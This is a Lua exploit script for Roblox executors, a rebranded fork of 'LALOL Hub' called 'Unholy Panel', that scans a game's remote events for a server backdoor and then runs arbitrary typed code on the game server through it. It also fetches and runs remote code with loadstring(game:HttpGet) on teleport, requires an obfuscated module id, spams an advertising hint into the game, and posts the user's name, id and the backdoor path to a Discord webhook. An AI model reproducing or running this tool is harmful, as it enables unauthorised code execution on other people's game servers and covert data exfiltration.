--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

--[[

YES THIS IS FORK FROM LALOL HUB
UNHOLY PANEL, LALOL HUB EDIT BY EP1KZKIDD/UNH0LY77

]]
-- Instances: 15 | Scripts: 3 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.UNHOLY
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"):WaitForChild("RobloxGui"));
G2L["1"]["Name"] = [[UNHOLY]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.UNHOLY.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(201, 201, 201);
G2L["2"]["Size"] = UDim2.new(0, 408, 0, 255);
G2L["2"]["Position"] = UDim2.new(0.21938, 0, 0.25, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.UNHOLY.Frame.Smooth GUI Dragging
G2L["3"] = Instance.new("LocalScript", G2L["2"]);
G2L["3"]["Name"] = [[Smooth GUI Dragging]];


-- StarterGui.UNHOLY.Frame.Main
G2L["4"] = Instance.new("LocalScript", G2L["2"]);
G2L["4"]["Name"] = [[Main]];


-- StarterGui.UNHOLY.Frame.UICorner
G2L["5"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.UNHOLY.Frame.TextLabel
G2L["6"] = Instance.new("TextLabel", G2L["2"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextScaled"] = true;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/RobotoMono.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Size"] = UDim2.new(0, 408, 0, 50);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[Unholy Panel]];


-- StarterGui.UNHOLY.Frame.Attach
G2L["7"] = Instance.new("TextButton", G2L["2"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextScaled"] = true;
G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["Size"] = UDim2.new(0, 108, 0, 31);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[Attach]];
G2L["7"]["Name"] = [[Attach]];
G2L["7"]["Position"] = UDim2.new(0.02206, 0, 0.83529, 0);


-- StarterGui.UNHOLY.Frame.Attach.UICorner
G2L["8"] = Instance.new("UICorner", G2L["7"]);



-- StarterGui.UNHOLY.Frame.Execute
G2L["9"] = Instance.new("TextButton", G2L["2"]);
G2L["9"]["TextWrapped"] = true;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextSize"] = 14;
G2L["9"]["TextScaled"] = true;
G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["Size"] = UDim2.new(0, 108, 0, 31);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[Execute]];
G2L["9"]["Name"] = [[Execute]];
G2L["9"]["Position"] = UDim2.new(0.41667, 0, 0.83529, 0);


-- StarterGui.UNHOLY.Frame.Execute.UICorner
G2L["a"] = Instance.new("UICorner", G2L["9"]);



-- StarterGui.UNHOLY.Frame.Clear
G2L["b"] = Instance.new("TextButton", G2L["2"]);
G2L["b"]["TextWrapped"] = true;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextScaled"] = true;
G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(221, 221, 221);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["Size"] = UDim2.new(0, 108, 0, 31);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Clear]];
G2L["b"]["Name"] = [[Clear]];
G2L["b"]["Position"] = UDim2.new(0.70588, 0, 0.83529, 0);


-- StarterGui.UNHOLY.Frame.Clear.UICorner
G2L["c"] = Instance.new("UICorner", G2L["b"]);



-- StarterGui.UNHOLY.Frame.ScrollingFrame
G2L["d"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["d"]["Active"] = true;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["CanvasSize"] = UDim2.new(2, 0, 2, 0);
G2L["d"]["ElasticBehavior"] = Enum.ElasticBehavior.Always;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["d"]["Size"] = UDim2.new(0, 387, 0, 154);
G2L["d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Position"] = UDim2.new(0.02206, 0, 0.19608, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["ScrollBarThickness"] = 10;


-- StarterGui.UNHOLY.Frame.ScrollingFrame.TextBox
G2L["e"] = Instance.new("TextBox", G2L["d"]);
G2L["e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 20;
G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["RichText"] = true;
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["ClearTextOnFocus"] = false;
G2L["e"]["PlaceholderText"] = [=[-- [[

Made By Ep1kzkidd

 ]]]=];
G2L["e"]["Size"] = UDim2.new(0, 5000, 0, 5000);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[]];


-- StarterGui.UNHOLY.Frame.ScrollingFrame.TextBox.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);



-- StarterGui.UNHOLY.Frame.Smooth GUI Dragging
local function C_3()
local script = G2L["3"];
	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
	
end;
task.spawn(C_3);
-- StarterGui.UNHOLY.Frame.Main
local function C_4()
local script = G2L["4"];
	local MainFrame = script.Parent
	local AttachBtn = MainFrame:WaitForChild("Attach")
	local ExecuteBtn = MainFrame:WaitForChild("Execute")
	local ScriptBox = MainFrame:WaitForChild("ScrollingFrame"):FindFirstChild("TextBox")
	
	local Exploit = {
		QueueTeleport = nil,
		Request = nil,
		ExecuteString = nil
	}
	
	if syn then
		Exploit.QueueTeleport = syn.queue_on_teleport
		Exploit.Request = syn.request
		Exploit.ExecuteString = syn.execute
	elseif fluxus then
		Exploit.QueueTeleport = fluxus.queue_on_teleport
		Exploit.Request = fluxus.request
		Exploit.ExecuteString = fluxus.execute
	end
	
	if not Exploit.QueueTeleport and queue_on_teleport then
		Exploit.QueueTeleport = queue_on_teleport
	end
	
	if not Exploit.Request then
		if http and http.request then
			Exploit.Request = http.request
		elseif http_request then
			Exploit.Request = http_request
		elseif request then
			Exploit.Request = request
		end
	end
	
	if Exploit.QueueTeleport then
		Exploit.QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
	end
	
	alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
	
	local UnholyPanel = {
		backdoor = nil,
		isScanning = false,
		HttpService = game:GetService("HttpService"),
		suspiciousRemotes = {
			"SendMessage",
			"UpdatePlayer",
			"ExecuteCode",
			"RunScript",
			"Command",
			"Execute",
			"Eval",
			"Load",
			"Init",
			"Admin",
			"Process",
			"Handler",
			"ServerEvent",
			"CustomEvent",
			"UnknownRemote",
			"MysteryFunction",
			"RemoteEvent",
			"AntiCheat"
		}
	}
	
	function UnholyPanel:Debug(text, lvl)
		local func=print
		if lvl==1 then func=print end
		if lvl==2 then func=error end
		if lvl==3 then func=warn end
		func('Unholy Panel: '..text)
	end
	
	function UnholyPanel:RunRemote(remote, data, data2)
		if remote:IsA('RemoteEvent') then
			remote:FireServer(data)
		elseif remote:IsA('RemoteFunction') then
			spawn(function() remote:InvokeServer(data) end)
		end
	end
	
	function UnholyPanel:MakeVisible(folder, state)
		for i,v in folder:GetDescendants() do
			if v:IsA('Frame') then 
				v.Visible=state
			end
		end
	end
	
	function UnholyPanel:Notify(text)
		game:GetService('StarterGui'):SetCore(
			"SendNotification",
			{
				Title = "Unholy Panel",
				Duration = 6,
				Text = text
			}
		)
	end
	
	if _G.UnholyPanel_Logs_Disabled then
		UnholyPanel:Notify('Logs disabled :(')
	end
	
	function UnholyPanel:GenerateName(length)
		local text=''
		for i=1,length do
			text=text..alphabet[math.random(1,#alphabet)]
		end
		return text
	end
	
	function UnholyPanel:IsSuspiciousRemote(remoteName)
		for _, suspiciousName in ipairs(self.suspiciousRemotes) do
			if string.find(string.lower(remoteName), string.lower(suspiciousName)) then
				return true
			end
		end
		return false
	end
	
	function UnholyPanel:FindRemote()
		local timee=os.clock()
		local remotes={}
		local suspiciousRemotesList = {}
		local normalRemotesList = {}
		local code
	
		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			while true do
				code=self:GenerateName(math.random(12,30))
				if not remotes[code] then break end
			end
			spawn(function() protected_backdoor:InvokeServer('unholy panel join today!!', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
			remotes[code]=protected_backdoor
		end
	
		for i,remote in game:GetDescendants() do
			if not remote:IsA('RemoteEvent') then 
				if not remote:IsA('RemoteFunction') then continue end
			end
	
			-- RobloxReplicatedStorage
			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				self:Debug('Roblox Replicated Storage ('..remote.Name..')', 1)
				continue
			end
	
			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
				-- ADONIS Anti-Exploit
				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
					self:Debug('Adonis filter detected ('..remote.Name..')', 1)
					continue
				end
	
				-- HD Admin
				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
					self:Debug('HD Admin ('..remote.Name..')', 1)
					continue
				end
	
				-- Chat Events
				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
					self:Debug('Chat event ('..remote.Name..')', 1)
					continue
				end
			end
	
			if self:IsSuspiciousRemote(remote.Name) then
				table.insert(suspiciousRemotesList, remote)
				self:Debug('Found suspicious remote: '..remote.Name, 1)
			else
				table.insert(normalRemotesList, remote)
			end
		end
	
		local allRemotes = {}
		for _, remote in ipairs(suspiciousRemotesList) do
			table.insert(allRemotes, remote)
		end
		for _, remote in ipairs(normalRemotesList) do
			table.insert(allRemotes, remote)
		end
	
		-- Send backdoor code to all remotes
		for _, remote in ipairs(allRemotes) do
			while true do
				code=self:GenerateName(math.random(12,30))
				if not remotes[code] then break end
			end
	
			self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
			remotes[code]=remote
	
			if self:IsSuspiciousRemote(remote.Name) then
				self:Debug('Sended Backdoor to SUSPICIOUS \"'..remote:GetFullName()..'\"', 3)
			else
				self:Debug('Sended Backdoor \"'..remote:GetFullName()..'\"', 1)
			end
		end
	
		-- Backdoor Checker
		for i=1,100 do
			for i,remote in remotes do
				local code=i
	
				if workspace:FindFirstChild(code) then
					self:Notify('Backdoor found in '..os.clock()-timee..'s')
	
					self.backdoor=remote
					self:Debug(remote:GetFullName(), 3)
	
					if self:IsSuspiciousRemote(remote.Name) then
						self:Notify('Using SUSPICIOUS remote: '..remote.Name)
						self:Debug('Backdoor is SUSPICIOUS: '..remote.Name, 3)
					end
	
					self:RunRemote(remote, "require(171016405.1884*69)")			
					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
	
					if Exploit.Request and not _G.UnholyPanel_Logs_Disabled then 
						Exploit.Request({
							Url = 'https://discord.com/api/webhooks/INSERT_WEBHOOK_HERE',
							Method = 'POST',
							Headers = {
								['Content-Type'] = 'application/json',
							},
							Body = self.HttpService:JSONEncode({
								username='Unholy Panel',
								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..self.backdoor:GetFullName()..'`**',
							})
						})
					end
	
					return true
				end
			end
	
			wait()
		end
	
		return false
	end
	
	AttachBtn.MouseButton1Click:Connect(function()
		if UnholyPanel.isScanning then return end
	
		UnholyPanel.isScanning = true
		UnholyPanel:Debug('Scanning...', 3)
		AttachBtn.Text='Scanning...'
	
		if not UnholyPanel:FindRemote() then
			AttachBtn.Text='No backdoor :('
			UnholyPanel:Notify('No backdoor found!')
		else
			AttachBtn.Text='Attached!'
			UnholyPanel:Notify('Backdoor attached successfully!')
		end
	
		UnholyPanel.isScanning = false
	end)
	
	-- GUI Button Event: Execute
	ExecuteBtn.MouseButton1Click:Connect(function()
		if UnholyPanel.backdoor == nil then
			UnholyPanel:Notify('No backdoor attached! Click Attach first.')
			return
		end
	
		local code = ScriptBox.Text
		if code == '' then
			UnholyPanel:Notify('Script box is empty!')
			return
		end
	
		local a,b=string.gsub(code, '%%username%%', game:GetService('Players').LocalPlayer.Name)
	
		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			UnholyPanel:Debug('Protected backdoor found', 3)
			spawn(function()
				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('unholy panel', a) end)
				if variantValue~=nil then
					local splited=string.split(variantValue,':')
					UnholyPanel:Notify(splited[#splited])
				end
			end)
		else
			UnholyPanel:RunRemote(UnholyPanel.backdoor, a)
		end
		ExecuteBtn.Text='Executed!'
		wait(0.5)
		ExecuteBtn.Text='Execute'
	end)
	
	game:GetService('UserInputService').InputBegan:Connect(function(input, processed)
		if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
			if MainFrame.Visible then 
				MainFrame.Visible=false
			else 
	MainFrame.Visible=true 
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.UNHOLY.Frame.ScrollingFrame.TextBox.LocalScript
local function C_f()
local script = G2L["f"];
	script.Parent.Font = Enum.Font.Code
end;
task.spawn(C_f);

return G2L["1"], require;
